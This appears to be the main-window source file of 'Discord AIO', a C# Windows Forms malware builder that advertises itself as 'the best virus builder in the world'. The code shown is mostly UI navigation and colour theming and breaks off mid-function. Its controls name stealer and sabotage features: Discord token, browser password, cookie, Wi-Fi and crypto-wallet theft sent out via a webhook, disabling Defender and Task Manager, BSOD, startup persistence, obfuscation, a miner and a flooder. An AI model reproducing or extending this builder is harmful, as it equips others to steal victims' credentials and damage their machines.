using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DiscordRPC;
using Leaf.xNet;
using ScintillaNET;

namespace discordAIO6
{
    public partial class dAIOmain : Form
    {
        private static string version = "0.6.0";

        public DiscordRpcClient dc_client;

        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

        public dAIOmain()
        {
            InitializeComponent();
            Region = Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 25, 25));

            logoBox.Image = Properties.Resources.d1;
            iconBox.Image = Properties.Resources.none;
             

            pnlNav.Height = btnDashboard.Height;
            pnlNav.Top = btnDashboard.Top;
            pnlNav.Left = btnDashboard.Left;
            btnDashboard.BackColor = Color.FromArgb(11, 11, 11);

            mainSite.Show();
            settingsSite.Hide();
            inspectorSite.Hide();
            additionalSite.Hide();
            miscSite.Hide();
            minerSite.Hide();

            usernameLabel.Text = Environment.UserName;
            versionLabel.Text = version;
            navLabel.Text = lmain;

            refreshLanguage();
            Scintilla();

            this._randomChars = new RandomCharacters();
            this.randomFileInfo_0 = new RandomInfo(this.randomCharacters_0);

            DiscordRPC();
        }

        private void dAIOmain_Load(object sender, EventArgs e)
        {

        }

        protected void DiscordRPC()
        {
            dc_client = new DiscordRpcClient("811586717433331732");
            dc_client.Initialize();
            dc_client.SetPresence(new RichPresence()
            {
                Details = "Running the best virus builder in the world...",
                State = "github.com/Nyxonn",
                Assets = new Assets()
                {
                    LargeImageKey = "daiorpc2",
                    LargeImageText = "Discord AIO v" + version
                }

            });
        }

        void Scintilla()
        {
            pluginSource.Lexer = Lexer.Cpp;
            pluginSource.StyleResetDefault();
            pluginSource.Styles[Style.Default].Font = "Consolas";
            pluginSource.Styles[Style.Default].Size = 10;
            pluginSource.Styles[Style.Default].BackColor = Color.FromArgb(5, 5, 5);
            pluginSource.Styles[Style.Default].ForeColor = Color.DarkRed;
            pluginSource.StyleClearAll();
            pluginSource.Styles[Style.Cpp.Default].ForeColor = System.Drawing.Color.DarkRed;
            pluginSource.Styles[Style.Cpp.Comment].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            pluginSource.Styles[Style.Cpp.CommentLine].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            pluginSource.Styles[Style.Cpp.CommentLineDoc].ForeColor = System.Drawing.Color.FromArgb(128, 128, 128);
            pluginSource.Styles[Style.Cpp.Number].ForeColor = System.Drawing.Color.Olive;
            pluginSource.Styles[Style.Cpp.Word].ForeColor = System.Drawing.Color.Blue;
            pluginSource.Styles[Style.Cpp.Word2].ForeColor = System.Drawing.Color.Blue;
            pluginSource.Styles[Style.Cpp.String].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.Character].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.Verbatim].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.StringEol].BackColor = System.Drawing.Color.Pink;
            pluginSource.Styles[Style.Cpp.Operator].ForeColor = System.Drawing.Color.Purple;
            pluginSource.Styles[Style.Cpp.Preprocessor].ForeColor = System.Drawing.Color.Maroon;
            pluginSource.Margins[0].Width = 16;
            pluginSource.Styles[Style.LineNumber].BackColor = Color.FromArgb(16, 16, 16);
            pluginSource.ScrollWidth = 1;
        }

        private readonly Random _random = new Random();
        private readonly RandomCharacters _randomChars;
        private readonly RandomCharacters randomCharacters_0;
        private readonly RandomInfo randomFileInfo_0;

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private void Form1_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void btnExit_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void btnDashboard_Click(object sender, EventArgs e)
        {
            pnlNav.Height = btnDashboard.Height;
            pnlNav.Top = btnDashboard.Top;
            pnlNav.Left = btnDashboard.Left;
            btnDashboard.BackColor = Color.FromArgb(11, 11, 11);

            navLabel.Text = lmain;

            mainSite.Show();
            settingsSite.Hide();
            inspectorSite.Hide();
            additionalSite.Hide();
            miscSite.Hide();
            minerSite.Hide();
        }

        private void btnInventory_Click(object sender, EventArgs e)
        {
            pnlNav.Height = btnInventory.Height;
            pnlNav.Top = btnInventory.Top;
            pnlNav.Left = btnInventory.Left;
            btnInventory.BackColor = Color.FromArgb(11, 11, 11);

            navLabel.Text = additional;

            mainSite.Hide();
            settingsSite.Hide();
            inspectorSite.Hide();
            additionalSite.Show();
            miscSite.Hide();
            minerSite.Hide();
        }

        private void btnWork_Click(object sender, EventArgs e)
        {
            pnlNav.Height = btnWork.Height;
            pnlNav.Top = btnWork.Top;
            pnlNav.Left = btnWork.Left;
            btnWork.BackColor = Color.FromArgb(11, 11, 11);

            navLabel.Text = inspector;

            settingsSite.Hide();
            inspectorSite.Show();
            additionalSite.Hide();
            mainSite.Hide();
            miscSite.Hide();
            minerSite.Hide();
        }

        private void btnMap_Click(object sender, EventArgs e)
        {
            pnlNav.Height = btnMap.Height;
            pnlNav.Top = btnMap.Top;
            pnlNav.Left = btnMap.Left;
            btnMap.BackColor = Color.FromArgb(11, 11, 11);

            navLabel.Text = misc;

            mainSite.Hide();
            settingsSite.Hide();
            additionalSite.Hide();
            inspectorSite.Hide();
            miscSite.Show();
            minerSite.Hide();
        }

        private void btnParty_Click(object sender, EventArgs e)
        {
            pnlNav.Height = btnParty.Height;
            pnlNav.Top = btnParty.Top;
            pnlNav.Left = btnParty.Left;
            btnParty.BackColor = Color.FromArgb(11, 11, 11);

            navLabel.Text = lminer;

            mainSite.Hide();
            settingsSite.Hide();
            additionalSite.Hide();
            inspectorSite.Hide();
            miscSite.Hide();
            minerSite.Show();
        }

        private void btnSettings_Click(object sender, EventArgs e)
        {
            pnlNav.Height = btnSettings.Height;
            pnlNav.Top = btnSettings.Top;
            pnlNav.Left = btnSettings.Left;
            btnSettings.BackColor = Color.FromArgb(11, 11, 11);

            navLabel.Text = settings;

            mainSite.Hide();
            settingsSite.Show();
            miscSite.Hide();
            additionalSite.Hide();
            inspectorSite.Hide();
            minerSite.Hide();
        }

        private void btnDashboard_Leave(object sender, EventArgs e)
        {
            btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
        }

        private void btnInventory_Leave(object sender, EventArgs e)
        {
            btnInventory.BackColor = Color.FromArgb(8, 8, 8);
        }

        private void btnWork_Leave(object sender, EventArgs e)
        {
            btnWork.BackColor = Color.FromArgb(8, 8, 8);
        }

        private void btnMap_Leave(object sender, EventArgs e)
        {
            btnMap.BackColor = Color.FromArgb(8, 8, 8);
        }

        private void btnParty_Leave(object sender, EventArgs e)
        {
            btnParty.BackColor = Color.FromArgb(8, 8, 8);
        }

        private void btnSettings_Leave(object sender, EventArgs e)
        {
            btnSettings.BackColor = Color.FromArgb(8, 8, 8);
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/qjrDprutvg");
        }

        private string Title = "N/A";
        private string Description = "N/A";
        private string Product = "N/A";
        private string Company = "N/A";
        private string Copyright = "N/A";
        private string Trademark = "N/A";
        private string MajorVersion = "N/A";
        private string MinorVersion = "N/A";
        private string BuildPart = "N/A";
        private string PrivatePart = "N/A";

        private void redButton_Click(object sender, EventArgs e)
        {
            logoBox.Image = Properties.Resources.d1;
            iconBox.Image = Properties.Resources.none;

            button1.FlatAppearance.BorderSize = 0;
            button2.FlatAppearance.BorderSize = 0;
            redButton.FlatAppearance.BorderSize = 1;
            button3.FlatAppearance.BorderSize = 0;

            if (translateLabel.Text != "null")
            {
                translateLabel.ForeColor = Color.DarkRed;
            }
            if (checkingLabel.Text != "null")
            {
                checkingLabel.ForeColor = Color.DarkRed;
            }

            navLabel.ForeColor = Color.DarkRed;
            usernameLabel.ForeColor = Color.DarkRed;
            versionLabel.ForeColor = Color.DarkRed;
            pnlNav.BackColor = Color.DarkRed;
            btnDashboard.ForeColor = Color.DarkRed;
            btnInventory.ForeColor = Color.DarkRed;
            btnWork.ForeColor = Color.DarkRed;
            btnMap.ForeColor = Color.DarkRed;
            btnParty.ForeColor = Color.DarkRed;
            btnSettings.ForeColor = Color.DarkRed;
            btnExit.ForeColor = Color.DarkRed;
            label1.ForeColor = Color.DarkRed;
            label2.ForeColor = Color.DarkRed;
            label3.ForeColor = Color.DarkRed;
            label4.ForeColor = Color.DarkRed;
            label5.ForeColor = Color.DarkRed;
            label6.ForeColor = Color.DarkRed;
            label7.ForeColor = Color.DarkRed;
            shYes.ForeColor = Color.DarkRed;
            shNo.ForeColor = Color.DarkRed;
            btnUpdates.ForeColor = Color.DarkRed;
            webhookBox.ForeColor = Color.DarkRed;
            englishButton.ForeColor = Color.DarkRed;
            russianButton.ForeColor = Color.DarkRed;
            frenchButton.ForeColor = Color.DarkRed;
            polishButton.ForeColor = Color.DarkRed;
            turkishButton.ForeColor = Color.DarkRed;
            spanishButton.ForeColor = Color.DarkRed;
            label57.ForeColor = Color.DarkRed;
            label54.ForeColor = Color.DarkRed;
            label53.ForeColor = Color.DarkRed;
            label37.ForeColor = Color.DarkRed;
            label52.ForeColor = Color.DarkRed;
            textBox6.ForeColor = Color.DarkRed;
            textBox1.ForeColor = Color.DarkRed;
            textBox3.ForeColor = Color.DarkRed;
            checkBox2.ForeColor = Color.DarkRed;
            checkBox3.ForeColor = Color.DarkRed;
            checkBox4.ForeColor = Color.DarkRed;
            label17.ForeColor = Color.DarkRed;
            label18.ForeColor = Color.DarkRed;
            label19.ForeColor = Color.DarkRed;
            label20.ForeColor = Color.DarkRed;
            label21.ForeColor = Color.DarkRed;
            faketitleBox.ForeColor = Color.DarkRed;
            fakeMessageBox.ForeColor = Color.DarkRed;
            obfuscateBox.ForeColor = Color.DarkRed;
            errorBox.ForeColor = Color.DarkRed;
            startupBox.ForeColor = Color.DarkRed;
            defenderBox.ForeColor = Color.DarkRed;
            taskmanagerBox.ForeColor = Color.DarkRed;
            bsodBox.ForeColor = Color.DarkRed;
            pluginBox.ForeColor = Color.DarkRed;
            blockerBox.ForeColor = Color.DarkRed;
            hidesBox.ForeColor = Color.DarkRed;
            jumpscareBox.ForeColor = Color.DarkRed;
            inputdBox.ForeColor = Color.DarkRed;
            swinkeyBox.ForeColor = Color.DarkRed;
            sbrpassBox.ForeColor = Color.DarkRed;
            sbrCookiesBox.ForeColor = Color.DarkRed;
            sVpnBox.ForeColor = Color.DarkRed;
            swifiBox.ForeColor = Color.DarkRed;
            sbrhisBox.ForeColor = Color.DarkRed;
            dinternetBox.ForeColor = Color.DarkRed;
            cryptoBox.ForeColor = Color.DarkRed;
            pluginSource.Lexer = Lexer.Cpp;
            pluginSource.StyleResetDefault();
            pluginSource.Styles[Style.Default].Font = "Consolas";
            pluginSource.Styles[Style.Default].Size = 10;
            pluginSource.Styles[Style.Default].BackColor = Color.FromArgb(5, 5, 5);
            pluginSource.Styles[Style.Default].ForeColor = Color.DarkRed;
            pluginSource.StyleClearAll();
            pluginSource.Styles[Style.Cpp.Default].ForeColor = System.Drawing.Color.DarkRed;
            pluginSource.Styles[Style.Cpp.Comment].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            pluginSource.Styles[Style.Cpp.CommentLine].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            pluginSource.Styles[Style.Cpp.CommentLineDoc].ForeColor = System.Drawing.Color.FromArgb(128, 128, 128);
            pluginSource.Styles[Style.Cpp.Number].ForeColor = System.Drawing.Color.Olive;
            pluginSource.Styles[Style.Cpp.Word].ForeColor = System.Drawing.Color.Blue;
            pluginSource.Styles[Style.Cpp.Word2].ForeColor = System.Drawing.Color.Blue;
            pluginSource.Styles[Style.Cpp.String].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.Character].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.Verbatim].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.StringEol].BackColor = System.Drawing.Color.Pink;
            pluginSource.Styles[Style.Cpp.Operator].ForeColor = System.Drawing.Color.Purple;
            pluginSource.Styles[Style.Cpp.Preprocessor].ForeColor = System.Drawing.Color.Maroon;
            pluginSource.Margins[0].Width = 16;
            pluginSource.Styles[Style.LineNumber].BackColor = Color.FromArgb(16, 16, 16);
            pluginSource.ScrollWidth = 1;
            label9.ForeColor = Color.DarkRed;
            label8.ForeColor = Color.DarkRed;
            fileinfoLabel.ForeColor = Color.DarkRed;
            buildingLabel.ForeColor = Color.DarkRed;
            embedBox.BackColor = Color.DarkRed;
            webhookCheck.ForeColor = Color.DarkRed;
            webhookCheck.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            webhookCheck.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            iconUpload.ForeColor = Color.DarkRed;
            iconUpload.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            iconUpload.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            colorSelect.ForeColor = Color.DarkRed;
            colorSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            colorSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            generateButton.ForeColor = Color.DarkRed;
            generateButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            generateButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            cloneButton.ForeColor = Color.DarkRed;
            cloneButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            cloneButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            buildButton.ForeColor = Color.DarkRed;
            buildButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            buildButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            label14.ForeColor = Color.DarkRed;
            label10.ForeColor = Color.DarkRed;
            label11.ForeColor = Color.DarkRed;
            label12.ForeColor = Color.DarkRed;
            label13.ForeColor = Color.DarkRed;
            label15.ForeColor = Color.DarkRed;
            label16.ForeColor = Color.DarkRed;
            dAIObox.ForeColor = Color.DarkRed;
            nameBox.ForeColor = Color.DarkRed;
            ipBox.ForeColor = Color.DarkRed;
            macBox.ForeColor = Color.DarkRed;
            tokenBox.ForeColor = Color.DarkRed;
            winBox.ForeColor = Color.DarkRed;
            exportCredentials.ForeColor = Color.DarkRed;
            exportCredentials.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            exportCredentials.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            dAIOupload.ForeColor = Color.DarkRed;
            dAIOupload.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            dAIOupload.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            label28.ForeColor = Color.DarkRed;
            pumpBox.ForeColor = Color.DarkRed;
            pumpPathBox.ForeColor = Color.DarkRed;
            label22.ForeColor = Color.DarkRed;
            label29.ForeColor = Color.DarkRed;
            miscWebhookBox.ForeColor = Color.DarkRed;
            TokenCheckerBox.ForeColor = Color.DarkRed;
            label23.ForeColor = Color.DarkRed;
            label24.ForeColor = Color.DarkRed;
            userBox.ForeColor = Color.DarkRed;
            textBox2.ForeColor = Color.DarkRed;
            label27.ForeColor = Color.DarkRed;
            flooderEmbed.BackColor = Color.DarkRed;
            safeBox.ForeColor = Color.DarkRed;
            label26.ForeColor = Color.DarkRed;
            label25.ForeColor = Color.DarkRed;
            label36.ForeColor = Color.DarkRed;
            label30.ForeColor = Color.DarkRed;
            label31.ForeColor = Color.DarkRed;
            label32.ForeColor = Color.DarkRed;
            label33.ForeColor = Color.DarkRed;
            label34.ForeColor = Color.DarkRed;
            label35.ForeColor = Color.DarkRed;
            tNameLabel.ForeColor = Color.DarkRed;
            tEmailLabel.ForeColor = Color.DarkRed;
            tPhoneLabel.ForeColor = Color.DarkRed;
            tIDLabel.ForeColor = Color.DarkRed;
            tMFALabel.ForeColor = Color.DarkRed;
            tVLabel.ForeColor = Color.DarkRed;
            kbBox.ForeColor = Color.DarkRed;
            mbBox.ForeColor = Color.DarkRed;
            gbBox.ForeColor = Color.DarkRed;
            pumpButton.ForeColor = Color.DarkRed;
            pumpButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            pumpButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            button4.ForeColor = Color.DarkRed;
            button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            tokenChecker.ForeColor = Color.DarkRed;
            tokenChecker.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            tokenChecker.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            flooderEmSelect.ForeColor = Color.DarkRed;
            flooderEmSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            flooderEmSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            button6.ForeColor = Color.DarkRed;
            button6.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            button6.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            button5.ForeColor = Color.DarkRed;
            button5.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            button5.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            wdeleteButton.ForeColor = Color.DarkRed;
            wdeleteButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            wdeleteButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
            button8.ForeColor = Color.DarkRed;
            button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
            button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            logoBox.Image = Properties.Resources.d3;
            iconBox.Image = Properties.Resources.none2;

            button1.FlatAppearance.BorderSize = 1;
            button2.FlatAppearance.BorderSize = 0;
            redButton.FlatAppearance.BorderSize = 0;
            button3.FlatAppearance.BorderSize = 0;

            if (translateLabel.Text != "null")
            {
                translateLabel.ForeColor = Color.LimeGreen;
            }
            if (checkingLabel.Text != "null")
            {
                checkingLabel.ForeColor = Color.LimeGreen;
            }

            navLabel.ForeColor = Color.LimeGreen;
            usernameLabel.ForeColor = Color.LimeGreen;
            versionLabel.ForeColor = Color.LimeGreen;
            pnlNav.BackColor = Color.LimeGreen;
            btnDashboard.ForeColor = Color.LimeGreen;
            btnInventory.ForeColor = Color.LimeGreen;
            btnWork.ForeColor = Color.LimeGreen;
            btnMap.ForeColor = Color.LimeGreen;
            btnParty.ForeColor = Color.LimeGreen;
            btnSettings.ForeColor = Color.LimeGreen;
            btnExit.ForeColor = Color.LimeGreen;
            label1.ForeColor = Color.LimeGreen;
            label2.ForeColor = Color.LimeGreen;
            label3.ForeColor = Color.LimeGreen;
            label4.ForeColor = Color.LimeGreen;
            label5.ForeColor = Color.LimeGreen;
            label6.ForeColor = Color.LimeGreen;
            label7.ForeColor = Color.LimeGreen;
            shYes.ForeColor = Color.LimeGreen;
            shNo.ForeColor = Color.LimeGreen;
            btnUpdates.ForeColor = Color.LimeGreen;
            webhookBox.ForeColor = Color.LimeGreen;
            englishButton.ForeColor = Color.LimeGreen;
            russianButton.ForeColor = Color.LimeGreen;
            frenchButton.ForeColor = Color.LimeGreen;
            polishButton.ForeColor = Color.LimeGreen;
            turkishButton.ForeColor = Color.LimeGreen;
            spanishButton.ForeColor = Color.LimeGreen;
            label57.ForeColor = Color.LimeGreen;
            label54.ForeColor = Color.LimeGreen;
            label53.ForeColor = Color.LimeGreen;
            label37.ForeColor = Color.LimeGreen;
            label52.ForeColor = Color.LimeGreen;
            textBox6.ForeColor = Color.LimeGreen;
            textBox1.ForeColor = Color.LimeGreen;
            textBox3.ForeColor = Color.LimeGreen;
            checkBox2.ForeColor = Color.LimeGreen;
            checkBox3.ForeColor = Color.LimeGreen;
            checkBox4.ForeColor = Color.LimeGreen;
            label17.ForeColor = Color.LimeGreen;
            label18.ForeColor = Color.LimeGreen;
            label19.ForeColor = Color.LimeGreen;
            label20.ForeColor = Color.LimeGreen;
            label21.ForeColor = Color.LimeGreen;
            faketitleBox.ForeColor = Color.LimeGreen;
            fakeMessageBox.ForeColor = Color.LimeGreen;
            obfuscateBox.ForeColor = Color.LimeGreen;
            errorBox.ForeColor = Color.LimeGreen;
            startupBox.ForeColor = Color.LimeGreen;
            defenderBox.ForeColor = Color.LimeGreen;
            taskmanagerBox.ForeColor = Color.LimeGreen;
            bsodBox.ForeColor = Color.LimeGreen;
            pluginBox.ForeColor = Color.LimeGreen;
            blockerBox.ForeColor = Color.LimeGreen;
            hidesBox.ForeColor = Color.LimeGreen;
            jumpscareBox.ForeColor = Color.LimeGreen;
            inputdBox.ForeColor = Color.LimeGreen;
            swinkeyBox.ForeColor = Color.LimeGreen;
            sbrpassBox.ForeColor = Color.LimeGreen;
            sbrCookiesBox.ForeColor = Color.LimeGreen;
            sVpnBox.ForeColor = Color.LimeGreen;
            swifiBox.ForeColor = Color.LimeGreen;
            sbrhisBox.ForeColor = Color.LimeGreen;
            dinternetBox.ForeColor = Color.LimeGreen;
            cryptoBox.ForeColor = Color.LimeGreen;
            pluginSource.Lexer = Lexer.Cpp;
            pluginSource.StyleResetDefault();
            pluginSource.Styles[Style.Default].Font = "Consolas";
            pluginSource.Styles[Style.Default].Size = 10;
            pluginSource.Styles[Style.Default].BackColor = Color.FromArgb(5, 5, 5);
            pluginSource.Styles[Style.Default].ForeColor = Color.LimeGreen;
            pluginSource.StyleClearAll();
            pluginSource.Styles[Style.Cpp.Default].ForeColor = System.Drawing.Color.LimeGreen;
            pluginSource.Styles[Style.Cpp.Comment].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            pluginSource.Styles[Style.Cpp.CommentLine].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            pluginSource.Styles[Style.Cpp.CommentLineDoc].ForeColor = System.Drawing.Color.FromArgb(128, 128, 128);
            pluginSource.Styles[Style.Cpp.Number].ForeColor = System.Drawing.Color.Olive;
            pluginSource.Styles[Style.Cpp.Word].ForeColor = System.Drawing.Color.Blue;
            pluginSource.Styles[Style.Cpp.Word2].ForeColor = System.Drawing.Color.Blue;
            pluginSource.Styles[Style.Cpp.String].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.Character].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.Verbatim].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            pluginSource.Styles[Style.Cpp.StringEol].BackColor = System.Drawing.Color.Pink;
            pluginSource.Styles[Style.Cpp.Operator].ForeColor = System.Drawing.Color.Purple;
            pluginSource.Styles[Style.Cpp.Preprocessor].ForeColor = System.Drawing.Color.Maroon;
            pluginSource.Margins[0].Width = 16;
            pluginSource.Styles[Style.LineNumber].BackColor = Color.FromArgb(16, 16, 16);
            pluginSource.ScrollWidth = 1;
            label9.ForeColor = Color.LimeGreen;
            label8.ForeColor = Color.LimeGreen;
            fileinfoLabel.ForeColor = Color.LimeGreen;
            buildingLabel.ForeColor = Color.LimeGreen;
            embedBox.BackColor = Color.LimeGreen;
            webhookCheck.ForeColor = Color.LimeGreen;
            webhookCheck.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            webhookCheck.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            iconUpload.ForeColor = Color.LimeGreen;
            iconUpload.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            iconUpload.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            colorSelect.ForeColor = Color.LimeGreen;
            colorSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            colorSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            generateButton.ForeColor = Color.LimeGreen;
            generateButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            generateButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            cloneButton.ForeColor = Color.LimeGreen;
            cloneButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            cloneButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            buildButton.ForeColor = Color.LimeGreen;
            buildButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            buildButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            label14.ForeColor = Color.LimeGreen;
            label10.ForeColor = Color.LimeGreen;
            label11.ForeColor = Color.LimeGreen;
            label12.ForeColor = Color.LimeGreen;
            label13.ForeColor = Color.LimeGreen;
            label15.ForeColor = Color.LimeGreen;
            label16.ForeColor = Color.LimeGreen;
            dAIObox.ForeColor = Color.LimeGreen;
            nameBox.ForeColor = Color.LimeGreen;
            ipBox.ForeColor = Color.LimeGreen;
            macBox.ForeColor = Color.LimeGreen;
            tokenBox.ForeColor = Color.LimeGreen;
            winBox.ForeColor = Color.LimeGreen;
            exportCredentials.ForeColor = Color.LimeGreen;
            exportCredentials.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            exportCredentials.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            dAIOupload.ForeColor = Color.LimeGreen;
            dAIOupload.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            dAIOupload.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            label28.ForeColor = Color.LimeGreen;
            pumpBox.ForeColor = Color.LimeGreen;
            pumpPathBox.ForeColor = Color.LimeGreen;
            label22.ForeColor = Color.LimeGreen;
            label29.ForeColor = Color.LimeGreen;
            miscWebhookBox.ForeColor = Color.LimeGreen;
            TokenCheckerBox.ForeColor = Color.LimeGreen;
            label23.ForeColor = Color.LimeGreen;
            label24.ForeColor = Color.LimeGreen;
            userBox.ForeColor = Color.LimeGreen;
            textBox2.ForeColor = Color.LimeGreen;
            label27.ForeColor = Color.LimeGreen;
            flooderEmbed.BackColor = Color.LimeGreen;
            safeBox.ForeColor = Color.LimeGreen;
            label26.ForeColor = Color.LimeGreen;
            label25.ForeColor = Color.LimeGreen;
            label36.ForeColor = Color.LimeGreen;
            label30.ForeColor = Color.LimeGreen;
            label31.ForeColor = Color.LimeGreen;
            label32.ForeColor = Color.LimeGreen;
            label33.ForeColor = Color.LimeGreen;
            label34.ForeColor = Color.LimeGreen;
            label35.ForeColor = Color.LimeGreen;
            tNameLabel.ForeColor = Color.LimeGreen;
            tEmailLabel.ForeColor = Color.LimeGreen;
            tPhoneLabel.ForeColor = Color.LimeGreen;
            tIDLabel.ForeColor = Color.LimeGreen;
            tMFALabel.ForeColor = Color.LimeGreen;
            tVLabel.ForeColor = Color.LimeGreen;
            kbBox.ForeColor = Color.LimeGreen;
            mbBox.ForeColor = Color.LimeGreen;
            gbBox.ForeColor = Color.LimeGreen;
            pumpButton.ForeColor = Color.LimeGreen;
            pumpButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            pumpButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            button4.ForeColor = Color.LimeGreen;
            button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            tokenChecker.ForeColor = Color.LimeGreen;
            tokenChecker.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            tokenChecker.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            flooderEmSelect.ForeColor = Color.LimeGreen;
            flooderEmSelect.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            flooderEmSelect.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            button6.ForeColor = Color.LimeGreen;
            button6.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            button6.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            button5.ForeColor = Color.LimeGreen;
            button5.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            button5.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            wdeleteButton.ForeColor = Color.LimeGreen;
            wdeleteButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
            wdeleteButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
            button8.ForeColor = Color.LimeGreen;
            button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
